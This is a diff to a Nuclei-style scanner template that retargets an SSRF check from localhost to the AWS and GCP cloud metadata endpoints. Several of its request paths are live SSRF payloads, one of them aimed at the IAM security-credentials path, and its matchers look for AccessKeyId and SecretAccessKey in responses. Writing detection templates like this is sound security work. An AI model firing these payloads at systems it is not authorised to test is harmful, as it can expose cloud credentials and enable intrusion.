@@ -1,32 +1,44 @@
-id: ssrf-url-param-custom
+id: ssrf-metadata-url-param-custom
 info:
-  name: SSRF via URL/Redirect Param (Custom)
+  name: SSRF to Cloud Metadata via URL/Redirect Param (Custom)
   author: watch-recon
   severity: high
-  description: Checks if url/redirect/next params fetch internal resources
-  tags: ssrf,generic
+  description: >
+    Full-response SSRF: a url/redirect/next-style param that fetches an
+    attacker-supplied URL and returns the body. Points the param at the cloud
+    metadata endpoints and matches on metadata-only tokens in the response.
+    Blind SSRF (no body reflected) is NOT covered here -- that needs interactsh,
+    which the pipeline currently disables with -ni.
+  reference:
+    - https://cloud.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
+  tags: ssrf,metadata,generic
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/?url=http://127.0.0.1:80"
-      - "{{BaseURL}}/?redirect=http://127.0.0.1:80"
-      - "{{BaseURL}}/?next=http://127.0.0.1:80"
-      - "{{BaseURL}}/?callback=http://127.0.0.1:80"
-      - "{{BaseURL}}/?return=http://127.0.0.1:80"
-      - "{{BaseURL}}/?target=http://127.0.0.1:80"
-      - "{{BaseURL}}/?dest=http://127.0.0.1:80"
-      - "{{BaseURL}}/?goto=http://127.0.0.1:80"
+      # AWS IMDS
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?next=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
+      # GCP metadata
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+    stop-at-first-match: true
 
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+      # Metadata-only tokens -- these do not appear in a normal app response.
       - type: word
+        part: body
         words:
-          - "Apache"
-          - "nginx"
-          - "IIS"
-          - "Server"
+          - "ami-id"
+          - "instance-id"
+          - "iam/security-credentials"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "computeMetadata"
         condition: or
